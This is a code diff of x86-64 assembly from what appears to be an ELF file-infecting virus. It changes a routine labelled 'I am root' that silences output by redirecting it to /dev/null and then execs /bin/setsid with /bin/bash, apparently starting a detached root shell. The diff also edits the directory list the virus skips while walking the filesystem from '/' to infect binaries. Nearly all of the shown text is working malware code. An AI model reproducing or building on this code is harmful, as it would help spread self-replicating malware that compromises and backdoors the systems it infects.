@@ -410,7 +410,9 @@ _search_dir:
 	syscall
 
 	cmp rax, 0x0
-	jz _i_am_root
+	jz .i_am_root
+
+ret
 %endif
 
 	.check_process:
@@ -439,53 +441,52 @@ _search_dir:
 ret
 
 %ifdef FSOCIETY
-_i_am_root:
-	push r9
-	pop rdx
+	.i_am_root:
+		push r9
+		pop rdx
 
-	lea rdi, [rel devnull]
-	push 1
-	pop rsi
-	push 2
-	pop rax;open("/dev/null", O_WRONLY)
-	syscall
-	push rax
-	pop rdi
-	push 1
-	pop rsi
-	push 33
-	pop rax; dup2(fd, 1)
-	syscall
-	push 2
-	pop rsi
-	push 33
-	pop rax; dup2(fd, 2)
-	syscall
-; let open otherwise don't work on guest
-;	mov rax, 3; close(fd)
-;	syscall
+		lea rdi, [rel devnull]
+		push 1
+		pop rsi
+		push 2
+		pop rax;open("/dev/null", O_WRONLY)
+		syscall
+		push rax
+		pop rdi
+		push 1
+		pop rsi
+		push 33
+		pop rax; dup2(fd, 1)
+		syscall
+		push 2
+		pop rsi
+		push 33
+		pop rax; dup2(fd, 2)
+		syscall
+	; let open otherwise don't work on guest
+	;	mov rax, 3; close(fd)
+	;	syscall
 
-	; I am root
-	xor rax, rax
-	push rax; NULL
-	lea rdi, [rel argv3]
-	push rdi
-	lea rdi, [rel argv2]
-	push rdi
-	lea rdi, [rel argv1]
-	push rdi
-	lea rdi, [rel argv0]
-	push rdi
+		; I am root
+		xor rax, rax
+		push rax; NULL
+		lea rdi, [rel argv3]
+		push rdi
+		lea rdi, [rel argv2]
+		push rdi
+		lea rdi, [rel argv1]
+		push rdi
+		lea rdi, [rel argv0]
+		push rdi
 
-	mov rsi, rsp
-	lea rdi, [rel argv0]
-	push 59
-	pop rax
-	syscall
+		mov rsi, rsp
+		lea rdi, [rel argv0]
+		push 59
+		pop rax
+		syscall
 
-	add rsp, 32
-
-	call _exit
+		add rsp, 32
+		call _exit
 %endif
 
 _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
@@ -1079,7 +1080,7 @@ ret
 elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0
 %ifdef FSOCIETY
 	directories db `/`, 0x0, 0x0
-	dotdir db `.`, 0x0, `..`, 0x0, `dev`, 0x0, `proc`, 0x0, `sys`, 0x0, 0x0
+	dotdir db `.`, 0x0, `..`, 0x0, `dev`, 0x0, `proc`, 0x0, 0x0
 	devnull db `/dev/null`, 0x0
 	argv0 db `/bin/setsid`, 0x0
 	argv1 db `/bin/bash`, 0x0
